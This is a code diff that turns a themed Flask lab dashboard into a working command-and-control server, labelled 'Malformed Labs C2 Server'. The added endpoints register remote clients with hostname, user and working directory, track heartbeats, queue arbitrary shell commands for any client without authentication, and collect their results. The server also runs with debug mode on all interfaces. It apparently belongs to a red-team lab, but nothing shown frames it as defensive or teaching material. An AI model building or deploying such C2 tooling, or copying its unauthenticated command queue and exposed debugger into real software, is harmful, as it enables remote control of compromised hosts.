@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-Outrun Themed Web Server
-A cyberpunk/synthwave styled web interface for the lab environment
-"""
-
 from flask import Flask, render_template, jsonify, request
 import os
 import subprocess
@@ -12,8 +7,18 @@ import socket
 from datetime import datetime
 from ping3 import ping, verbose_ping
 import docker
+import time
+import threading
+from collections import defaultdict
 
 app = Flask(__name__)
+
+# Connection monitoring storage
+connected_clients = {}  # client_id -> {info, last_seen, status}
+connection_events = []  # List of connection events with timestamps
+client_commands = defaultdict(list)  # client_id -> [commands]
+client_results = defaultdict(list)  # client_id -> [results]
+connections_lock = threading.Lock()
 
 # Initialize Docker client
 try:
@@ -170,8 +175,8 @@ def ping_endpoints():
     """Test connectivity to other endpoints in the lab network using ICMP ping"""
     endpoints = {
         '192.168.210.10': 'linux_endpoint1 (Alpine)',
-        '192.168.210.11': 'linux_endpoint2 (Ubuntu)', 
-        '192.168.210.12': 'linux_endpoint3 (CentOS)'
+        '192.168.210.11': 'linux_endpoint2 (Alpine)', 
+        '192.168.210.12': 'linux_endpoint3 (Alpine)'
     }
     results = {}
     
@@ -446,10 +451,201 @@ def api_execute():
             'error': f'Command not allowed. Available commands: {", ".join(safe_commands.keys())}'
         })
 
+# ==== CLIENT CONNECTION MONITORING ENDPOINTS ====
+
+def add_connection_event(event_type, client_id, details=""):
+    """Add a connection event to the monitoring log"""
+    with connections_lock:
+        event = {
+            'timestamp': datetime.now().isoformat(),
+            'type': event_type,  # 'connect', 'disconnect', 'heartbeat', 'command', 'register'
+            'client_id': client_id,
+            'details': details
+        }
+        connection_events.append(event)
+        
+        # Keep only last 100 events
+        if len(connection_events) > 100:
+            connection_events.pop(0)
+
+@app.route('/api/register', methods=['POST'])
+def api_register_client():
+    """Register a new client connection"""
+    data = request.get_json()
+    if not data or 'client_id' not in data:
+        return jsonify({'success': False, 'error': 'Invalid registration data'})
+    
+    client_id = data['client_id']
+    
+    with connections_lock:
+        # Update client info
+        connected_clients[client_id] = {
+            'client_id': client_id,
+            'hostname': data.get('hostname', 'unknown'),
+            'os': data.get('os', 'unknown'),
+            'arch': data.get('arch', 'unknown'),
+            'user': data.get('user', 'unknown'),
+            'pwd': data.get('pwd', 'unknown'),
+            'local_ip': data.get('local_ip', request.remote_addr),
+            'remote_ip': request.remote_addr,
+            'first_seen': datetime.now().isoformat(),
+            'last_seen': datetime.now().isoformat(),
+            'status': 'connected',
+            'command_count': 0,
+            'result_count': 0
+        }
+    
+    # Log the registration event
+    add_connection_event('register', client_id, f"New client from {request.remote_addr}")
+    
+    print(f"[+] Client registered: {client_id} from {request.remote_addr}")
+    
+    return jsonify({'success': True, 'message': 'Client registered successfully'})
+
+@app.route('/api/heartbeat', methods=['POST'])
+def api_heartbeat():
+    """Handle client heartbeat"""
+    data = request.get_json()
+    if not data or 'client_id' not in data:
+        return jsonify({'success': False, 'error': 'Invalid heartbeat data'})
+    
+    client_id = data['client_id']
+    
+    with connections_lock:
+        if client_id in connected_clients:
+            connected_clients[client_id]['last_seen'] = datetime.now().isoformat()
+            connected_clients[client_id]['status'] = 'connected'
+        else:
+            # Auto-register if not found
+            connected_clients[client_id] = {
+                'client_id': client_id,
+                'hostname': 'unknown',
+                'os': 'unknown',
+                'remote_ip': request.remote_addr,
+                'first_seen': datetime.now().isoformat(),
+                'last_seen': datetime.now().isoformat(),
+                'status': 'connected',
+                'command_count': 0,
+                'result_count': 0
+            }
+    
+    # Log heartbeat (but only occasionally to avoid spam)
+    if int(time.time()) % 30 == 0:  # Log every 30th heartbeat
+        add_connection_event('heartbeat', client_id, "Client alive")
+    
+    return jsonify({'success': True})
+
+@app.route('/api/clients/<client_id>', methods=['GET'])
+def api_get_client_commands(client_id):
+    """Get pending commands for a specific client"""
+    with connections_lock:
+        commands = client_commands.get(client_id, [])
+        # Mark commands as delivered
+        client_commands[client_id] = []
+    
+    return jsonify({
+        'success': True,
+        'commands': commands
+    })
+
+@app.route('/api/clients/<client_id>/command', methods=['POST'])
+def api_send_client_command(client_id):
+    """Send a command to a specific client"""
+    data = request.get_json()
+    if not data or 'command' not in data:
+        return jsonify({'success': False, 'error': 'No command provided'})
+    
+    command_id = f"cmd-{int(time.time())}-{client_id}"
+    command_data = {
+        'id': command_id,
+        'command': data['command'],
+        'timestamp': datetime.now().isoformat()
+    }
+    
+    with connections_lock:
+        client_commands[client_id].append(command_data)
+        if client_id in connected_clients:
+            connected_clients[client_id]['command_count'] += 1
+    
+    add_connection_event('command', client_id, f"Sent: {data['command']}")
+    
+    return jsonify({'success': True, 'command_id': command_id})
+
+@app.route('/api/results', methods=['POST'])
+def api_receive_results():
+    """Receive command results from clients"""
+    data = request.get_json()
+    if not data or 'client_id' not in data:
+        return jsonify({'success': False, 'error': 'Invalid result data'})
+    
+    client_id = data['client_id']
+    command_id = data.get('command_id', 'unknown')
+    result = data.get('result', {})
+    
+    result_data = {
+        'command_id': command_id,
+        'timestamp': datetime.now().isoformat(),
+        'result': result,
+        'client_id': client_id
+    }
+    
+    with connections_lock:
+        client_results[client_id].append(result_data)
+        if client_id in connected_clients:
+            connected_clients[client_id]['result_count'] += 1
+            connected_clients[client_id]['last_seen'] = datetime.now().isoformat()
+    
+    add_connection_event('result', client_id, f"Command result received")
+    
+    return jsonify({'success': True})
+
+@app.route('/api/connections')
+def api_connections():
+    """Get current client connections and events"""
+    with connections_lock:
+        # Clean up stale connections (no heartbeat in 5 minutes)
+        current_time = datetime.now()
+        stale_clients = []
+        
+        for client_id, info in connected_clients.items():
+            last_seen = datetime.fromisoformat(info['last_seen'])
+            if (current_time - last_seen).seconds > 300:  # 5 minutes
+                info['status'] = 'disconnected'
+                stale_clients.append(client_id)
+        
+        # Log disconnections
+        for client_id in stale_clients:
+            add_connection_event('disconnect', client_id, "Connection timeout")
+        
+        return jsonify({
+            'success': True,
+            'clients': dict(connected_clients),
+            'events': connection_events[-20:],  # Last 20 events
+            'total_clients': len(connected_clients),
+            'active_clients': len([c for c in connected_clients.values() if c['status'] == 'connected']),
+            'total_events': len(connection_events)
+        })
+
+@app.route('/api/client/<client_id>/results')
+def api_client_results(client_id):
+    """Get results for a specific client"""
+    with connections_lock:
+        results = client_results.get(client_id, [])
+    
+    return jsonify({
+        'success': True,
+        'client_id': client_id,
+        'results': results[-10:]  # Last 10 results
+    })
+
 if __name__ == '__main__':
     # Create templates directory if it doesn't exist
     os.makedirs('templates', exist_ok=True)
     os.makedirs('static/css', exist_ok=True)
     os.makedirs('static/js', exist_ok=True)
+    
+    print("[*] Starting Malformed Labs C2 Server")
+    print("[*] Connection monitoring enabled")
+    print("[*] Access dashboard at http://0.0.0.0:8080")
     
     app.run(host='0.0.0.0', port=8080, debug=True)
